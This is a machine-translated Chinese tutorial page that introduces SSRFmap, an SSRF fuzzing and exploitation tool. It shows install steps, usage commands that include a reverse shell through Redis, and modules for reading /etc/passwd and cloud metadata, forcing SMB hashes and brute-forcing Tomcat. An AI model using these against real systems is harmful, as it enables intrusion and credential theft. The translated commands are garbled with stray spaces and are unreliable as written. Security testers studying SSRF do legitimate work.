# SSRFmap:自动 SSRF 模糊器及开发工具

> 原文：<https://kalilinuxtutorials.com/ssrfmap-ssrf-fuzzer-exploitation/>

SSRF 通常用于利用其他服务上的动作，该框架旨在轻松地发现和利用这些服务。SSRFmap 将一个 Burp 请求文件作为输入，并将一个参数作为 fuzz。

注意:服务器端请求伪造或 SSRF 是一个漏洞，攻击者在其中强迫服务器代表他们执行请求。

**又念:** [Pwndb:搜索泄露的凭据](https://kalilinuxtutorials.com/pwndb-search-leaked-credentials/)

**指南/ RTFM**

从 Github 库进行基本安装。

git 克隆 https://github.com/swisskyrepo/SSRFmap
CD SSRFmap/
pip 3 install-r requirements . txt
python 3 SSRFmap . py
用法:SSRFmap . py[-h][-r req file][-p PARAM][-LHOST LHOST][–LPORT LPORT][–LEVEL LEVEL]

**可选参数:** -h、 –帮助显示此帮助消息并退出
-r REQFILE SSRF 请求文件
-p PARAM SSRF 参数到目标
-m 模块 SSRF 模块启用
-l 处理程序启动反向外壳的处理程序
–LHOST LHOST LHOST 反向外壳
–LPORT LPORT 反向外壳
–LEVEL[LEVEL]要执行的测试级别(1-5，默认值:1)

使用该脚本的默认方式如下。

在 localhost 上启动 portscan 并读取默认文件
python ssrfmap . py-r data/request . txt-p URL-m read files，portscan
在 Redis 上触发反向 shell
python ssrfmap . py-r data/request . txt-p URL-m Redis–lhost = 127 . 0 . 0 . 1–lport = 4242-l 4242
-l 在指定端口上创建反向 shell 的侦听器
–lhost 和–lport 工作例如:127 . 0 . 0 . 1->[::]->0000:->…

使用 data/example.py SSRF 服务可以快速测试该框架。

FLASK _ APP = data/example . py FLASK run &
python ssrfmap . py-r data/request . txt-p URL-m read files

## 模块

以下模块已经实现，可以与`-m`参数一起使用。

| 名字 | 描述 |
| --- | --- |
| `fastcgi` | FastCGI |
| `redis` | 核证的排减量 |
| `github` | Github 企业版< 2.8.7 |
| `zabbix` | 扎比克斯·RCE |
| `mysql` | MySQL 命令执行 |
| `docker` | 通过 API 对接信息泄漏 |
| `smtp` | SMTP 发送邮件 |
| `portscan` | 扫描主机的端口 |
| `networkscan` | HTTP Ping 扫描整个网络 |
| `readfiles` | 读取文件如`/etc/passwd` |
| `alibaba` | 从提供商处读取文件(例如:元数据、用户数据) |
| `aws` | 从提供商处读取文件(例如:元数据、用户数据) |
| `gce` | 从提供商处读取文件(例如:元数据、用户数据) |
| `digitalocean` | 从提供商处读取文件(例如:元数据、用户数据) |
| `socksproxy` | SOCKS4 代理 |
| `smbhash` | 通过 UNC 路径强制 SMB 身份验证 |
| `tomcat` | 对 Tomcat 管理器的暴力攻击 |

[**Download**](https://github.com/swisskyrepo/SSRFmap/blob/master/README.md)